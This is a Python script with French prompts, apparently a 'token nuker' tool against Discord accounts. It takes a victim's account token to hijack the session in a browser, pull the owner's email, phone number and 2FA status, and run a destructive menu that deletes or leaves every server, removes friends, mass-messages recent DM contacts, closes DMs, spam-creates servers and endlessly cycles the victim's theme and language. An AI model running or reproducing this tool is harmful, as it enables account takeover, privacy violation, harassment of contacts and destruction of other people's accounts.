import threading, requests, discord, random, time, os

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

init(convert=True)
guildsIds = []
friendsIds = []
channelIds = []
clear = lambda: os.system('cls')
clear()

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] Token Invalide", e)
            input("Appuier sur une touche pour quitter..."); exit(0)

def tokenLogin(token):
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.RED}ID{Fore.RESET}]         {userID}
            [{Fore.RED}Pseudo{Fore.RESET}]       {userName}
            [{Fore.RED}2FA{Fore.RESET}]        {mfa}

            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Numéro{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}

            ''')
            input()

def tokenFuck(token):
    headers = {'Authorization': token}
    gdel = input(f'Voulez vous supprimez tout les serveur de ce compte. y/n [Pas De Majuscule] > ')
    fdel = input('Voulez vous supprimez tout les amis de ce compte. y/n [Pas De Majuscule] > ')
    sendall = input('Voulez vous envoyer un dm à tous les dms récents de ce compte. y/n [Pas De Majuscule] > ')
    fremove = input('Voulez vous supprimer tous les dms de ce compte récents. y/n [Pas De Majuscule] > ')
    gleave = input('Voulez vous quitter toutes les serveur de ce compte. y/n [Pas De Majuscule] > ')
    gcreate = input('Voulez vous spam création de serveurs sur ce compte.  y/n [Pas De Majuscule] > ')
    dlmode = input('Voulez vous spam changement de mode clair et sombre. y/n [Pas De Majuscule] > ')
    langspam = input('Voulez vous changer le language de la victime. y/n [Pas De Majuscule] > ')
    print(f"[{Fore.RED}+{Fore.RESET}] Hack...")

    if sendall == 'y':
        try:
            sendmessage = input('Que voulez-vous envoyer à tout le monde sur le DMS récent. > ')
            for id in channelIds:
                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
                print(f'Message privée envoyé à l id {id}')
        except Exception as e:
            print(f'Erreur détectée, ignorant. {e}')

    if gleave == 'y':
        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
                print(f'Serveur quittée {guild}')
        except Exception as e:
            print(f'Erreur détectée, ignorant. {e}')

    if fdel == 'y':
        try:
            for friend in friendsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
                print(f'Amis Supprimée {friend}')
        except Exception as e:
            print(f'Erreur détectée, ignorant. {e}')

    if fremove == 'y':
        try:
            for id in channelIds:
                requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
                print(f'Dm avec id {id} fermée')
        except Exception as e:
            print(f'Erreur détectée, ignorant. {e}')

    if gdel == 'y':
        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
                print(f'Serveur supprimée : {guild}')
        except Exception as e:
            print(f'Erreur détectée, ignorant. {e}')

    if gcreate == 'y':
        try:
            gname = input('Quel nom de serveur à spam voulez-vous mettre. > ')
            gserv = input('Combien de serveur voulez vous créer. [max 100]')
            for i in range(int(gserv)):
                payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
                print(f'Serveur {gname} créer. Numéro: {i}')
        except Exception as e:
            print(f'Erreur détectée, ignorant. {e}')

    if dlmode == 'y':
        try:
            modes = cycle(["light", "dark"])
        except Exception as e:
            print(f'Erreur détectée, ignorant. {e}')

    if langspam == 'y':
        try:
            while True:
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
        except Exception as e:
            print(f'Erreur détectée, ignorant. {e}')

    time.sleep(9999)

def getBanner():
    banner = f'''
                [{Fore.RED}Créateur :{Fore.RESET} Hash]
                [{Fore.RED}Github :{Fore.RESET} https://github.com/Hashounet]
                [{Fore.RED}1{Fore.RESET}] Détruire un compte
                [{Fore.RED}2{Fore.RESET}] Prendre les informations du compte
                [{Fore.RED}3{Fore.RESET}] Se connecter au compte via Token

    '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
    return banner

def startMenu():
    print(getBanner())
    print(f'[{Fore.RED}>{Fore.RESET}] Votre choix', end=''); choice = str(input('  :  '))


    if choice == '1':
        print(f'[{Fore.RED}>{Fore.RESET}] Token du Compte', end=''); token = input('  :  ')
        print(f'[{Fore.RED}>{Fore.RESET}] Nombre de threads (nombre)', end=''); threads = input('  :  ')
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokenFuck, args=(token, ))
            t.start()

    elif choice == '2':
        print(f'[{Fore.RED}>{Fore.RESET}] Token du Compte', end=''); token = input('  :  ')
        tokenInfo(token)
    
    elif choice == '3':
        print(f'[{Fore.RED}>{Fore.RESET}] Token du Compte', end=''); token = input('  :  ')
        tokenLogin(token)


    elif choice.isdigit() == False:
        clear()
        startMenu()

    else:
        clear()
        startMenu()


if __name__ == '__main__':
    startMenu()
